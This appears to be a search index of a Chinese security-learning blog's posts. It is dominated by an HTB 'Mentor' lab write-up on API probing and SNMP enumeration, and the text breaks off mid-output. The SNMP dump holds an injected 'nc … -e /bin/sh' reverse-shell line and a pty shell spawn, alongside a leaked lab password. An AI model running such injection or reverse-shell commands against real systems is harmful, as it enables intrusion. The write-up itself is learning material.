[{"title":"初九 潜龙勿用：自学安全小白的2022年总结  ","tags":[],"categories":[],"author":"1dayluo","excerpt":"很遗憾的在开头说，过去一年里，我的重心并不在于「产出」，而是在于 积累和学习。因为我觉得我现在并不到产出的过程（虽然也有少数几个部分）。思来想去还是写一篇吧，毕竟也有很多人像我一样，从外行的noob开","link":"/posts/history/2022-nian-zong-jie"},{"title":"20220714 回头看,往前走","tags":[],"categories":[],"author":"1dayluo","excerpt":"最近思考自己的长期目标,发现最初定下目标的时候目标的框架是模糊的,随着你越走越深,发现自己的失败.主要是由于你在定目标时对目标的不够了解,你以为过程是A到D,D到F,实际上发现A到D之间还有BC,AB","link":"/posts/history/20220714-hui-tou-kan-wang-qian-zou"},{"title":"AWS 常见安全问题总结（一）","tags":["云安全","学习笔记"],"categories":[],"author":"1dayluo","excerpt":"\r\n\r\n公开靶场:http://flaws.cloud/\r\n\r\n## S3常见的安全问题\r\n\r\n### 安全问题概括\r\n\r\n概括如下：\r\n\r\n1. s3桶名为全局变量，默认是aws上任意两个用户不能有","link":"/posts/history/aws-chang-jian-an-quan-wen-ti-zong-jie-yi"},{"title":"CC1链 学习笔记","tags":["java","学习笔记","java漏洞","cc1"],"categories":[],"author":"1dayluo","excerpt":"# CC1链\n\n## 前言\n\n大佬们文章很细很全, 为了给自己捋思路…….就比如: 把有疑惑的点反复看,然后在不同的文章里(以及google搜索,补充基础知识etc)找到”为什么这里用XXXX”的原因","link":"/posts/history/cc1-lian-xue-xi-bi-ji"},{"title":"Code-Audit-Challenges#php 刷题记录【历史笔记】","tags":[],"categories":[],"author":"1dayluo","excerpt":"    \r\n\r\n> 堆点安全的博文，一直以来是笔记党。把去年8月的刷题笔记发上来。正在做的攻防世界没做啥刷题笔记，就用这篇代替啦（bu \r\n> 今年光顾着写代码了，安全啥的给落下了还是要继续努力>-<  （而且发现好久不巩固是会忘记的，又要再次巩固学习一次了）\r\n\r\n\r\n\r\n题目列表\r\n- https://github.com/CHYbeta/Code-Audit-Challenges\r\nhttps://blog.szfszf.top/tech/code-audit-challenge-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/\r\n","link":"/posts/history/code-audit-challengesphp-shua-ti-ji-lu-li-shi-bi-ji"},{"title":"CVE-2018-0114 POC编写与实践","tags":["jwt","CVE","学习笔记"],"categories":[],"author":"1dayluo","excerpt":"\n一篇水文。。。起名困难症（改了几次） 参考思路就行\n\n## POC构造思路\n\n1. 先生成rsa密钥 ：public key 和private key\n\n```python\nimport rsa \n","link":"/posts/history/cve-2018-0114"},{"title":"CVE-2023-50164 漏洞分析与学习","tags":["漏洞分析","CVE","java","笔记","学习笔记"],"categories":[],"author":"1dayluo","excerpt":"\n\n官方的主要修复有：\n\n- **[Makes HttpParameters case-insensitive](https://github.com/apache/struts/commit/d8c","link":"/posts/history/cve-2023-50164-lou-dong-fen-xi-yu-xue-xi"},{"title":"更新了blog内的htb的文章,设置加密","tags":[],"categories":[],"author":"1dayluo","excerpt":"![](https://imgtu.com/i/HiARIA)\n\n","link":"/posts/history/geng-xin-liao-blog-nei-de-htb-de-wen-zhang-she-zhi-jia-mi"},{"title":" Gogs RCE 历史漏洞学习笔记","tags":["漏洞分析","笔记","靶场","刷题","学习笔记"],"categories":[],"author":"1dayluo","excerpt":"\n\n<aside>\n💡 This exercise covers how to get code execution against the Git self hosted tool: Gogs.\n","link":"/posts/history/gogs-rce-li-shi-lou-dong-xue-xi-bi-ji"},{"title":"Google Dorking Learn","tags":["笔记","学习笔记"],"categories":[],"author":"1dayluo","excerpt":"# Google Dorking Learn\n\nLearn from: https://exposingtheinvisible.org/guides/google-dorking/\n\n## To d","link":"/posts/history/google-dorking-learn"},{"title":"[gruyere|笔记]一个web平台的漏洞学习笔记-","tags":["靶场"],"categories":[],"author":"1dayluo","excerpt":"Web Application Exploits and Defenses (google-gruyere.appspot.com) \r\n据说是包括了所有web2.0的漏洞\r\n\r\n## 使用前需知\r\n","link":"/posts/history/gruyereorbi-ji-yi-ge-web-ping-tai-de-lou-dong-xue-xi-bi-ji-"},{"title":" 关于目录遍历漏洞中，非标准编码%C0%2F和%C0%AF均能代表/，且均在漏洞中生效的原理探索","tags":["编码","技术阅读","笔记"],"categories":[],"author":"1dayluo","excerpt":"学习自下的回答，本内容为阅读对应资料后的笔记和自己的理解：\r\n[Why does Directory traversal attack %C0%AF work?](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)\r\n\r\n## 基础知识\r\n\r\nbits：组成bytes，是最小的单位\r\n\r\nbytes：由8个bits组成。\r\n\r\n## URL编码\r\n\r\nURL编码-\r\n\r\n- 也叫百分比编码（[https://en.wikipedia.org/wiki/Percent-encoding](https://en.wikipedia.org/wiki/Percent-encoding)）\r\n- 组成：%xx ，其中x代表一个十六进制的数字，能代表0-255内的数字\r\n- %xx代表一个byte\r\n\r\n%C0%2F：对应十进制192 (1100 0000) 和175 (1010 1111),\r\n\r\n%C0%AF：对应十进制的192 (1100 0000)和47 (0010 1111)\r\n\r\n","link":"/posts/history/guan-yu-mu-lu-bian-li-lou-dong-zhong-fei-biao-zhun-bian-ma-c02f-he-c0af-jun-neng-dai-biao-qie-jun-zai-lou-dong-zhong-sheng-xiao-de-yuan-li-tan-suo"},{"title":"关于opener的学习及利用","tags":["技术阅读","XSS"],"categories":[],"author":"1dayluo","excerpt":"# window.opener 学习\r\n\r\n[15:40]\r\n\r\n关于window.opener的补充学习：\r\n\r\n[](https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-2-7810ebfccc1d](https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-2-7810ebfccc1d))\r\n\r\n还是从part1开始读起吧（\r\n\r\n学习的过程偶尔会发愁，遇到很多英文，我还是一个头两个大。但是还是啃吧）：\r\n\r\npart1：[https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-1-c6be37701cab](https://medium.com/tsscyber/penetration-testing-window-opener-xss-vectors-part-1-c6be37701cab)\r\n\r\n和视频补充学习：[https://www.youtube.com/watch?v=veXDFx2qJBk](https://www.youtube.com/watch?v=veXDFx2qJBk)\r\n\r\n**part1介绍的内容：**\r\n\r\n- opener 变量 以及如何与同源政策相关联。\r\n- 该变量如何呗滥用以实现接近客户端重定向\r\n\r\n**part2介绍的内容：**\r\n\r\n- 在part1概念的基础上探讨新型XSS向量\r\n\r\n**part3介绍的内容：**\r\n\r\n- 来混淆一些有趣的跨窗口`eval` 函数 从而在第四部分讨论通用XSS的问题\r\n\r\n# Part 1\r\n\r\n## Introducing the window.opener variable\r\n\r\nopen 函数通常被用于在弹出的窗口中打开一个URL。这个函数经常被不良的网站打开烦人或恶意的广告，但是同样也有合法的使用。当你调用open函数，浏览器自动在新窗口中赋值一个变量指向打开该窗口的源窗口。这个变量自然地称作”opener‘\r\n\r\n","link":"/posts/history/guan-yu-opener-de-xue-xi-ji-li-yong"},{"title":"[HTB] petpet rcbee ","tags":["HTB","web"],"categories":[],"author":"1dayluo","excerpt":"\n\n# petpet rcbee\n\n~~又是一道flask+python的题(后来发现无关)~~ \n\n![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/petpetrobee_1.png)\n","link":"/posts/history/htb-petpet-rcbee"},{"title":"[HTB] Templated | writeup","tags":["HTB","web","刷题","靶场"],"categories":[],"author":"1dayluo","excerpt":"\n# Templated\n是ssti漏洞.\n\n但是之前学习burpsuite下的题目的时候,没有学到这个.之前了解过概念.于是我专门回顾和学习了一下jinja2\n\n尝试访问不存在的路径:\n\n    payload : /xyz\n\n    response : 发现会回显xyz在页面中\n\n\n","link":"/posts/history/htb-templated-or-writeup"},{"title":" [HTB] 又一道writeup:Weather | 收获颇多","tags":["HTB","web","靶场","刷题"],"categories":[],"author":"1dayluo","excerpt":"\n\n# Weather App\n\n这道题值得慢慢啃,如果有缘看到我这篇writeup的话,建议你实在啃不下再看(或者只看卡住的地方)\n\n## 题目分析\n\n不管用burp抓包,还是分析源代码.均可以看到,天气的获取以POST方式请求了`/api/weather` 接口(源代码见`/static/js/main.js` )\n\n看源代码进行审计的时候,还发现了在`/static/host-unreachable.jpg` 下的一个图片\n\n","link":"/posts/history/htb-weather-App"},{"title":"[HTB]Backend - API","tags":["HTB","API","笔记"],"categories":[],"author":"1dayluo","excerpt":"# Backend - API\n\n突然想做这个box的起因是看到一条tweet，qwq 原来做box这么有用的嘛\n\n![Untitled](https://cdn.jsdelivr.net/gh/1d","link":"/posts/history/htbbackend-api"},{"title":" HTB：Encoding","tags":["HTB","靶场","刷题"],"categories":[],"author":"1dayluo","excerpt":"\n\n标签：api, php, .git, ssrf, lfi to rce,post-commit hook,service\n\n………慢慢来，不要着急。打退役box积攒经验中…\n\n## Recon\n\n","link":"/posts/history/htbencoding"},{"title":"HTB:Forgot","tags":["HTB","学习笔记","刷题","靶场"],"categories":[],"author":"1dayluo","excerpt":"# HTB：Forgot\n\n## Recon\n\n端口扫描结果\n\n\n1.nmap扫描结果：\n```shell\nPORT   STATE SERVICE\n22/tcp open  ssh\n53/tcp o","link":"/posts/history/htbforgot"},{"title":"HTB:Mentor","tags":["刷题","HTB","学习笔记"],"categories":[],"author":"1dayluo","excerpt":"# HTB：Mentor\n\n## RECON\n\n是Flask（ `2.0.3`) 的网站，**TCP**端口扫描结果就是： `20`, `53` , `80` ，然后试着目录遍历（不过我第一次使用的字典暂时没有什么有价值的收获）和子域名，在这个同时我会去翻看网页源代码和其他信息\n\n在搜查的过程中，发现了使用到了 `Werkzeug` ，关于它的介绍如下：\n\n> \n> \n> \n> 在Python Web开发中，Werkzeug通常与其他框架（如Flask、Django等）一起使用，作为这些框架的底层库。使用Werkzeug，开发人员可以更轻松地处理HTTP请求和响应，实现中间件（middleware）和拦截器（interceptor）等功能，以及进行调试和测试。\n> \n> 总之，如果你在Python Web开发中需要处理HTTP请求和响应、实现中间件或进行调试和测试等任务，那么Werkzeug可能会是一个有用的技术栈\n> \n\n在著名的[hackertricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)下去查看一些针对 `Werkzeug` 的攻击手段，这里发现原始网页对 `/consoel` 是禁止访问的，所以需要去想办法查看PIN number\n\n原理讲解：[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) \n\nPIN的生成主要在以下的两个list变量中\n\n```python\nprobably_public_bits = [\n    username,\n    modname,\n    getattr(app, '__name__', getattr(app.__class__, '__name__')),\n    getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n    str(uuid.getnode()),\n    get_machine_id(),\n]\n# getattr(app, '__name__', getattr (app .__ class__, '__name__')) is Flask \n# getattr(mod, '__file__', None) is the absolute path of an app.py in the flask directory\n# uuid.getnode() is the MAC address of the current computer, str (uuid.getnode ()) is the decimal expression of the mac address\n# get_machine_id() read the value in /etc/machine-id or /proc/sys/kernel/random/boot_i and return directly if there is\n```\n\n其中 mac地址在 `/proc/net/arp` （指的是Linux）\n\n然后挖掘了一下，发现不是这里的问题 🥲  我发现我老是把简单的问题想复杂……啊啊啊啊啊啊（菜狗痛苦.jpg)。然后直线距离会绕个弯走。但是等待扫描结果的过程真的好痛苦（菜狗痛苦×2.jpg)……\n\n![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/20230315.png)\n\n反复测试，最后子域名发现了（竟然是404）\n\n- api.mentorquotes.htb\n\n同理，加入到 `/etc/hosts` 里。\n\n## 子域名扫描\n\n虽然我每个工具的命令都是单独总结的，但是偶尔贴一下吧\n\n```python\nwfuzz -c -w <dict> -u \"http://api.mentorquotes.htb/FUZZ\" --hc 404\n```\n\n结果\n\n```python\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                       \n=====================================================================\n000000004:   307        0 L      0 W        0 Ch        \"admin\"                                                                                                                                                                                       \n000000124:   200        30 L     62 W       969 Ch      \"docs\"                                                                                                                                                                                        \n000000205:   307        0 L      0 W        0 Ch        \"users\"\n000001440:   307        0 L      0 W        0 Ch        \"quotes\"\n000004658:   403        9 L      28 W       285 Ch      \"server-status\"\n\n```\n\n## /docs 探索\n\n### Auth\n\n以前也刷过关于api的box：[https://1dayluo.github.io/post/htbbackend-api/](https://1dayluo.github.io/post/htbbackend-api/)   （这个还真的不错，当时刷过一次就觉得学到了很多）\n\n注册\n\n![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303151.png)\n\n登录\n\n![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303152.png)\n\n返回的内容是：\n\n```python\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5la28xMjMiLCJlbWFpbCI6ImFiY0Bxd2UuY29tIn0.7UL_JZ9wxrauJQpEwNPXSXyqB2CGDo3pT4wmaNlQEr0\n```\n\n### Users\n\n直接用docs下的发起是失败的\n\n![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303153.png)\n\n然后我注意到了\n\n![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303154.png)\n\n把刚刚login的内容作为jwt传入到header里\n\n```lua\nGET /users/ HTTP/1.1\nHost: api.mentorquotes.htb\naccept: application/json\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36\nDNT: 1\nReferer: http://api.mentorquotes.htb/docs\nAuthorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im5la28xMjMiLCJlbWFpbCI6ImFiY0Bxd2UuY29tIn0.7UL_JZ9wxrauJQpEwNPXSXyqB2CGDo3pT4wmaNlQEr0\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nsec-gpc: 1\nConnection: close\n```\n\n返回：\n\n```lua\n{\"detail\":\"Only admin users can access this resource\"}\n```\n\n包括 `/users/{id}` 也是一样，虽然有跳转，但是最终还是提示只有管理员用户可以使用。看起来应该用了规则匹配，后面的 `/users/add` 应该也是同理\n\n### Quotes\n\n也是一样的道理。\n\n1. quotes - GET\n\n![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303155.png)\n\n1. quotes - POST ： 提示只有管理员才可以\n2. quotes - PUT ： 提示只有管理员才可以\n3. quotes - POST ： 提示只有管理员才可以\n4. quotes - DELETE ： 提示只有管理员才可以\n\n## SNMP - private\n\napi探索了好一阵，看哪里能获取管理员auth，但是无果。然后又回归到了大佬0xdf的博客（谢谢大佬TUT）\n\n我忽视了UDP port……\n\n```bash\nsudo nmap -p- -sU --min-rate 10000 -oA /tmp/nmap-udp 10.10.11.193\n\n# 扫描结果：\n# PORT    STATE SERVICE\n# 161/udp open  snmp\n```\n\n问chatGPT和newBing关于SNMP是干嘛的回答\n\n> chatGPT:\n一个网站可能需要使用SNMP来监控网络设备的状态和性能，以确保网络设备正常运行。例如，如果网站依赖于负载均衡器、路由器、交换机等网络设备，监控这些设备的状态和性能可以帮助管理员及时发现和解决网络问题，提高网络的可用性和可靠性。此外，SNMP还可以用于收集网站服务器的性能指标，如CPU利用率、内存使用率、磁盘空间等，以帮助管理员优化网站性能和资源利用率。\n\nBing:\n> \n> \n> 您好，这是Bing。😊\n> \n> SNMP（简单网络管理协议）是一种网络协议，用于管理和监视IP网络中的网络设备，如服务器，工作站，路由器，交换机等[1](https://www.pconline.com.cn/win11/1511/15111684.html)。一个网站可能需要用到SNMP的情况有：\n> \n> - 网站的管理员需要监控和配置网站的服务器或其他设备[2](https://resources.infosecinstitute.com/topic/snmp-pentesting/)。\n> - 网站的安全测试人员需要检测网站是否存在SNMP相关的漏洞[3](https://blog.domotz.com/know-your-networks/snmp-port-number/) [4](https://resources.infosecinstitute.com/topic/vulnerability-assessment-of-snmp-service-ii/)。\n> - 网站的用户需要通过SNMP获取网站的性能或状态信息。\n> \n> 您想了解更多关于SNMP的什么内容呢？\n> \n\n恩……这波是bing赢了\n\nsnmp除了用nmap外，还有以下工具：\n\n- https://github.com/SECFORCE/SNMP-Brute.git\n- https://github.com/trailofbits/onesixtyone\n\n我用了snmp-brute。首先要根据README下载一些基础依赖。然后按照官方/help来的运行就好，\n\n工具捕获到的数据 （发现管理员邮箱）\n\n```bash\n################## Enumerating SYSTEM Table using: iso.3.6.1.2.1.1  (SYSTEM Info)\n\tINFO\n\t----\t\n\tSTRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64\n\tOID: NET-SNMP-MIB::netSnmpAgentOIDs.10\n\tTimeticks: (6160235) 17:06:42.35\n\tSTRING: Me <admin@mentorquotes.htb>\n\tSTRING: mentor\n\tSTRING: Sitting on the Dock of the Bay\n\tINTEGER: 72\n\n################## Enumerating Interfaces Table using: -Ci (Interface Info)\n\tName   Mtu Network Address Ipkts Ierrs Opkts Oerrs Queue\n\n################## Enumerating Routing Table using: -Cr (Route Info)\n\n################## Enumerating Netstat Table using:  (Netstat)\n\tActive Internet (udp) Connections\n\tProto Local Address               Remote Address                PID\n\tudp4  *.*                         *.*                             0\n```\n\n这里不太会，就跟着佬们的writeup来学习了，\n\n然后我用了 `snmpbulkwalk` 工具\n\n```bash\nHOST-RESOURCES-MIB::hrSWRunPath.921 = STRING: \"/usr/libexec/udisks2/udisksd\"\nHOST-RESOURCES-MIB::hrSWRunPath.927 = STRING: \"/usr/sbin/ModemManager\"\nHOST-RESOURCES-MIB::hrSWRunPath.1200 = STRING: \"/usr/sbin/cron\"\nHOST-RESOURCES-MIB::hrSWRunPath.1208 = STRING: \"/usr/sbin/snmpd\"\nHOST-RESOURCES-MIB::hrSWRunPath.1221 = STRING: \"/usr/bin/containerd\"\nHOST-RESOURCES-MIB::hrSWRunPath.1242 = STRING: \"/sbin/agetty\"\nHOST-RESOURCES-MIB::hrSWRunPath.1243 = STRING: \"sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups\"\nHOST-RESOURCES-MIB::hrSWRunPath.1254 = STRING: \"/usr/sbin/apache2\"\nHOST-RESOURCES-MIB::hrSWRunPath.1340 = STRING: \"/usr/bin/dockerd\"\nHOST-RESOURCES-MIB::hrSWRunPath.1691 = STRING: \"/bin/bash\"\nHOST-RESOURCES-MIB::hrSWRunPath.1742 = STRING: \"/usr/bin/docker-proxy\"\nHOST-RESOURCES-MIB::hrSWRunPath.1755 = STRING: \"/usr/bin/containerd-shim-runc-v2\"\nHOST-RESOURCES-MIB::hrSWRunPath.1781 = STRING: \"postgres\"\nHOST-RESOURCES-MIB::hrSWRunPath.1838 = STRING: \"postgres: checkpointer \"\nHOST-RESOURCES-MIB::hrSWRunPath.1839 = STRING: \"postgres: background writer \"\nHOST-RESOURCES-MIB::hrSWRunPath.1840 = STRING: \"postgres: walwriter \"\nHOST-RESOURCES-MIB::hrSWRunPath.1841 = STRING: \"postgres: autovacuum launcher \"\nHOST-RESOURCES-MIB::hrSWRunPath.1842 = STRING: \"postgres: stats collector \"\nHOST-RESOURCES-MIB::hrSWRunPath.1843 = STRING: \"postgres: logical replication launcher \"\nHOST-RESOURCES-MIB::hrSWRunPath.1849 = STRING: \"/usr/bin/docker-proxy\"\nHOST-RESOURCES-MIB::hrSWRunPath.1863 = STRING: \"/usr/bin/containerd-shim-runc-v2\"\nHOST-RESOURCES-MIB::hrSWRunPath.1889 = STRING: \"python3\"\nHOST-RESOURCES-MIB::hrSWRunPath.1958 = STRING: \"/usr/bin/docker-proxy\"\nHOST-RESOURCES-MIB::hrSWRunPath.1971 = STRING: \"/usr/bin/containerd-shim-runc-v2\"\nHOST-RESOURCES-MIB::hrSWRunPath.1993 = STRING: \"python\"\nHOST-RESOURCES-MIB::hrSWRunPath.2007 = STRING: \"/usr/local/bin/python3\"\nHOST-RESOURCES-MIB::hrSWRunPath.2008 = STRING: \"/usr/local/bin/python3\"\nHOST-RESOURCES-MIB::hrSWRunPath.2092 = STRING: \"postgres: postgres mentorquotes_db 172.22.0.1(46844) idle\"\nHOST-RESOURCES-MIB::hrSWRunPath.2110 = STRING: \"/usr/bin/python3\"\nHOST-RESOURCES-MIB::hrSWRunPath.26610 = \"\"\nHOST-RESOURCES-MIB::hrSWRunPath.26614 = STRING: \"postgres: postgres mentorquotes_db 172.22.0.1(60892) idle\"\nHOST-RESOURCES-MIB::hrSWRunPath.91129 = \"\"\nHOST-RESOURCES-MIB::hrSWRunPath.91137 = \"\"\nHOST-RESOURCES-MIB::hrSWRunPath.91143 = STRING: \"sh\"\nHOST-RESOURCES-MIB::hrSWRunPath.91144 = STRING: \"/bin/sh\"\nHOST-RESOURCES-MIB::hrSWRunPath.91148 = STRING: \"python3\"\nHOST-RESOURCES-MIB::hrSWRunPath.91149 = STRING: \"/bin/sh\"\nHOST-RESOURCES-MIB::hrSWRunPath.91419 = STRING: \"/usr/libexec/upowerd\"\nHOST-RESOURCES-MIB::hrSWRunPath.91862 = \"\"\nHOST-RESOURCES-MIB::hrSWRunPath.91958 = STRING: \"/usr/sbin/apache2\"\nHOST-RESOURCES-MIB::hrSWRunPath.91959 = STRING: \"/usr/sbin/apache2\"\nHOST-RESOURCES-MIB::hrSWRunParameters.556 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.557 = STRING: \"-d -s\"\nHOST-RESOURCES-MIB::hrSWRunParameters.561 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.581 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.684 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.685 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.715 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.717 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.737 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.738 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.758 = STRING: \"-1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0\"\nHOST-RESOURCES-MIB::hrSWRunParameters.907 = STRING: \"--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\"\nHOST-RESOURCES-MIB::hrSWRunParameters.912 = STRING: \"--foreground\"\nHOST-RESOURCES-MIB::hrSWRunParameters.913 = STRING: \"/usr/bin/networkd-dispatcher --run-startup-triggers\"\nHOST-RESOURCES-MIB::hrSWRunParameters.914 = STRING: \"--no-debug\"\nHOST-RESOURCES-MIB::hrSWRunParameters.915 = STRING: \"-n -iNONE\"\nHOST-RESOURCES-MIB::hrSWRunParameters.927 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1200 = STRING: \"-f -P\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1208 = STRING: \"-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1221 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1242 = STRING: \"-o -p -- \\\\u --noclear tty1 linux\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1243 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1254 = STRING: \"-k start\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1340 = STRING: \"-H fd:// --containerd=/run/containerd/containerd.sock\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1691 = STRING: \"/usr/local/bin/login.sh\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1742 = STRING: \"-proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1755 = STRING: \"-namespace moby -id 96e44c5692920491cdb954f3d352b3532a88425979cd48b3959b63bfec98a6f4 -address /run/containerd/containerd.sock\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1781 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1838 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1839 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1840 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1841 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1842 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1843 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1849 = STRING: \"-proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1863 = STRING: \"-namespace moby -id 556e8c834293dd86447407ed131913827ab286e6c16eb2629ef5567c3beec9ba -address /run/containerd/containerd.sock\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1889 = STRING: \"-m uvicorn app.main:app --reload --workers 2 --host 0.0.0.0 --port 8000\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1958 = STRING: \"-proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1971 = STRING: \"-namespace moby -id 9fe6db6386def9ee85a401e564be071bc55984fa0962d8748de5e8d6b1076a30 -address /run/containerd/containerd.sock\"\nHOST-RESOURCES-MIB::hrSWRunParameters.1993 = STRING: \"main.py\"\nHOST-RESOURCES-MIB::hrSWRunParameters.2007 = STRING: \"-c from multiprocessing.semaphore_tracker import main;main(4)\"\nHOST-RESOURCES-MIB::hrSWRunParameters.2008 = STRING: \"-c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork\"\nHOST-RESOURCES-MIB::hrSWRunParameters.2092 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.2110 = STRING: \"/usr/local/bin/login.py kj23sadkj123as0-d213\"\nHOST-RESOURCES-MIB::hrSWRunParameters.26610 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.26614 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.91129 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.91137 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.91143 = STRING: \"-c tar -c -f $(nc 10.10.14.89 9001 -e /bin/sh)/app_backkup.tar /app/ &\"\nHOST-RESOURCES-MIB::hrSWRunParameters.91144 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.91148 = STRING: \"-c import pty;pty.spawn(\\\"/bin/sh\\\")\"\nHOST-RESOURCES-MIB::hrSWRunParameters.91149 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.91419 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.91862 = \"\"\nHOST-RESOURCES-MIB::hrSWRunParameters.91958 = STRING: \"-k start\"\nHOST-RESOURCES-MIB::hrSWRunParameters.91959 = STRING: \"-k start\"\nHOST-RESOURCES-MIB::hrSWRunParameters.92142 = \"\"\n```\n\n其中，这里有一个地方有些意思\n\n`: \"/usr/local/bin/login.py kj23sadkj123as0-d213\"` \n\n### Login as james\n\n这里本来试着用 `admin@mentorquotes.htb` 结果发现不行，看了提示才知道是docs最上面还泄漏了james的邮箱（ `james@mentorquotes.htb` )\n\n使用james身份登录\n\n![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303156.png)\n\n然后将刚刚docs下的api接口的Authorization都替换为james的，users有返回：\n\n```\n{\"id\":1,\"email\":\"james@mentorquotes.htb\",\"username\":\"james\"},{\"id\":2,\"email\":\"svc@mentorquotes.htb\",\"username\":\"service_acc\"}\n\n```\n\n还有就是能用 `/quotes` 接口，往里新增之类的\n\n另外 `/admin`  也可以用啦\n\n![Untitled](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303157.png)\n\n## SNMP - public\n\n刚刚的命令是获取snmp下 `private` 的部分，还有 `public` 的部分尝试获取：\n\n```bash\n~ snmpbulkwalk -v2c -c public 10.10.11.193                                                                                                                                       0 [11:48:10]\nSNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64\nSNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10\nDISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (6269914) 17:24:59.14\nSNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>\nSNMPv2-MIB::sysName.0 = STRING: mentor\nSNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay\nSNMPv2-MIB::sysServices.0 = INTEGER: 72\nSNMPv2-MIB::sysORLastChange.0 = Timeticks: (6) 0:00:00.06\nSNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance\nSNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance\nSNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance\nSNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB\nSNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup\nSNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB\nSNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB\nSNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip\nSNMPv2-MIB::sysORID.9 = OID: 